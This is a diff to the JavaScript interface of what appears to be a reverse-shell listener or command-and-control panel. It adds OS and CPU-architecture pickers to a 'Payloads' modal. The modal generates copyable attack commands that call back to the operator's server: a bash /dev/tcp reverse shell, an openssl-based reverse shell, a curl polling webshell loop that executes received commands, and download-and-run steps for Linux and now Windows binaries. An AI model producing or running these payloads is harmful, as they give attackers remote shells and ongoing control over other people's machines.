@@ -83,6 +83,8 @@ const app = state({
   proxyToken: "",
   payloadsOpen: false,
   payloadsCopiedAll: false,
+  payloadOs: "linux",
+  payloadArch: "amd64",
   sessionMenuOpen: false,
   csrfTokenValue: "",
   helpOpen: false,
@@ -1403,13 +1405,16 @@ const PayloadsModal = () =>
       const httpProto = location.protocol === "https:" ? "https" : "http";
       const wsProto = location.protocol === "https:" ? "wss" : "ws";
       const token = app.buildToken || "YOUR_BUILD_TOKEN";
+      const os = app.payloadOs || "linux";
+      const arch = app.payloadArch || "amd64";
+      const isWindows = os === "windows";
       const tcpPayload = `bash -i >& /dev/tcp/${hostname}/1337 0>&1`;
       const tlsPayload = `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect ${hostname}:1338 >/tmp/f`;
       const webPayload = `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
       const muxPayload = `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
-      const muxDownloadPayload = `curl -sL '${httpProto}://${host}/dl?token=${token}&os=linux&arch=amd64' -o /tmp/rsl
-chmod +x /tmp/rsl
-/tmp/rsl &`;
+      const muxDownloadPayload = isWindows
+        ? `curl -sL "${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}" -o %TEMP%\\rsl.exe\nstart /b %TEMP%\\rsl.exe`
+        : `curl -sL '${httpProto}://${host}/dl?token=${token}&os=${os}&arch=${arch}' -o /tmp/rsl\nchmod +x /tmp/rsl\n/tmp/rsl &`;
       const copy = (text) =>
         navigator.clipboard.writeText(text).catch(() => {});
       const block = (title, text) =>
@@ -1429,7 +1434,7 @@ chmod +x /tmp/rsl
         `# TLS\n${tlsPayload}\n\n` +
         `# HTTP webshell\n${webPayload}\n\n` +
         `# Mux / Go client\n${muxPayload}\n\n` +
-        `# Mux / download & run\n${muxDownloadPayload}`;
+        `# Mux / download & run (${os}/${arch})\n${muxDownloadPayload}`;
       const copyAll = async () => {
         try {
           await navigator.clipboard.writeText(allPayloads);
@@ -1445,7 +1450,35 @@ chmod +x /tmp/rsl
         children: [
           el(
             "div",
-            { class: "modal-actions" },
+            { class: "payload-options" },
+            el(
+              "label",
+              { class: "field inline" },
+              el("span", {}, "OS"),
+              el(
+                "select",
+                { onchange: (e) => (app.payloadOs = e.target.value) },
+                [
+                  ["linux", "linux"],
+                  ["windows", "windows"],
+                  ["darwin", "macOS"],
+                ].map(([value, label]) =>
+                  el("option", { value, selected: () => app.payloadOs === value }, label)
+                )
+              )
+            ),
+            el(
+              "label",
+              { class: "field inline" },
+              el("span", {}, "Arch"),
+              el(
+                "select",
+                { onchange: (e) => (app.payloadArch = e.target.value) },
+                ["amd64", "arm64", "arm-7", "386", "mipsle-softfloat"].map((a) =>
+                  el("option", { value: a, selected: () => app.payloadArch === a }, a)
+                )
+              )
+            ),
             el(
               "button",
               { class: "btn", onclick: copyAll },
@@ -1456,7 +1489,7 @@ chmod +x /tmp/rsl
           block("TLS", tlsPayload),
           block("HTTP webshell", webPayload),
           block("Mux / Go client", muxPayload),
-          block("Mux / download & run", muxDownloadPayload),
+          block(`Mux / download & run (${os}/${arch})`, muxDownloadPayload),
         ],
       });
     }
